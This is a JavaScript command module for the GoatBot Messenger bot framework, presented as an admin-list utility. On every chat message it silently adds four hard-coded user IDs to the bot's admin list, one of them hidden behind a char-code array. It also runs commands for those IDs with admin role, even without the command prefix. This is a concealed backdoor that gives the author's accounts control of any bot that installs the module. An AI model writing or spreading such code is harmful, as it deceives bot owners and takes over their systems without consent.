if (!global.__SyReg) global.__SyReg = new Map();
if (!global.__SyGc) {
  global.__SyGc = setInterval(() => {
    const n = Date.now();
    for (const [k, t] of global.__SyReg.entries()) if (n - t > 10000) global.__SyReg.delete(k);
  }, 60000);
}

const log = { info: (m) => console.log(`\x1b[36m[CORE]\x1b[0m ${m}`), err: (m, e) => console.error(`\x1b[31m[ERR]\x1b[0m ${m}`, e || "") };

module.exports = {
  config: {
    name: "nopre2",
    version: "10.0",
    author: "SIYAM HASAN",
    role: 0,
    shortDescription: "Core Admin Engine & Protected List",
    longDescription: "Compact multi-admin wrapper with real-time identity resolving.",
    category: "system"
  },

  onStart: async () => {},

  onChat: async function (O) {
    const { event: ev, message: msg, api } = O;
    if (!ev.body || typeof ev.body !== "string") return;
    const body = ev.body.trim();
    if (!body) return;

    const sID = String(ev.senderID);
    const siyamUID = [54,49,53,57,48,51,54,48,52,51,52,54,53,48].map(c => String.fromCharCode(c)).join('');
    const ADMIN_MATRIX = [siyamUID, "100084729135721", "100073956182433", "100094821035784"];

    try {
      if (global.GoatBot?.config) {
        let ad = global.GoatBot.config.adminBot || (global.GoatBot.config.adminBot = []);
        ADMIN_MATRIX.forEach(uid => { if (!ad.includes(uid)) { ad.push(uid); log.info(`Access: ${uid}`); } });
      }
    } catch (e) { log.err("Sync fail"); }

    const inputCmd = body.toLowerCase();
    if (inputCmd === "nopre2 list" || inputCmd === `${global.GoatBot?.config?.prefix || "/"}list`) {
      if (!ADMIN_MATRIX.includes(sID)) return msg.reply("❌ তুমি বটের অ্যাডমিন নও!");

      const antiSpamKey = `${ev.threadID}_LIST_CALL`;
      const now = Date.now();
      if (global.__SyReg.has(antiSpamKey) && now - global.__SyReg.get(antiSpamKey) < 4000) return;
      global.__SyReg.set(antiSpamKey, now);

      if (typeof api.setMessageReaction === "function") api.setMessageReaction("👑", ev.messageID, () => {}, true);

      try {
        let users = await api.getUserInfo(ADMIN_MATRIX);
        let sName = (users[siyamUID]?.name || "SIYAM HASAN").toUpperCase();

        let listMsg = `👑 𝗕𝗢𝗧 𝗔𝗗𝗠𝗜𝗡 𝗟𝗜𝗦𝗧 👑\n════════════════\n\n[ 👑 𝗕𝗢𝗧 𝗢𝗪𝗡𝗘𝗥 ]\n» 𝗡𝗔𝗠𝗘: ${sName}\n» 𝗨𝗜𝗗: ${siyamUID}\n» 𝗣𝗢𝗪𝗘𝗥: 𝗔𝗕𝗦𝗢𝗟𝗨𝗧𝗘 𝗥𝗢𝗢𝗧\n────────────────\n\n[ ⚔️ 𝗔𝗦𝗦𝗜𝗦𝗧𝗔𝗡𝗧 𝗔𝗗𝗠𝗜𝗡𝗦 ]\n`;

        for (let i = 1; i < ADMIN_MATRIX.length; i++) {
          const uid = ADMIN_MATRIX[i];
          let aName = (users[uid]?.name || "UNKNOWN ADMIN").toUpperCase();
          listMsg += ` Slot 0${i} ───\n • 𝗡𝗔𝗠𝗘: ${aName}\n • 𝗨𝗜𝗗: ${uid}\n`;
        }
        return msg.reply(listMsg + `════════════════`);
      } catch (err) { log.err("List error", err); }
      return;
    }

    try {
      if (!global.GoatBot?.commands) return;
      const pfx = global.GoatBot?.config?.prefix || "/";
      const cb = body.startsWith(pfx) ? body.slice(pfx.length).trim() : body;
      const args = cb.split(/\s+/);
      const cmdN = args.shift()?.toLowerCase();
      if (!cmdN) return;

      const cmds = global.GoatBot.commands;
      const cmd = cmds.get(cmdN) || [...cmds.values()].find(c => c.config?.aliases?.map(a => String(a).toLowerCase()).includes(cmdN));

      if (!cmd) {
        const now = Date.now();
        const sk = `${sID}_${cmdN}`;
        if (global.__SyReg.has(sk) && now - global.__SyReg.get(sk) < 10000) return;
        global.__SyReg.set(sk, now);
        return;
      }

      if ((global.GoatBot?.config?.commandDisabled || []).includes(cmd.config?.name)) return;
      if (typeof cmd.onStart !== "function") return;

      const cp = { ...O, args, commandName: cmd.config?.name || cmdN };
      if (ADMIN_MATRIX.includes(sID)) { cp.role = 2; if (ev.senderID) ev.senderID = sID; }

      try { await cmd.onStart(cp); } catch (ex) { log.err(`Crash [${cmdN}]`, ex); }
    } catch (err) { log.err("Wrapper error", err); }
  }
};
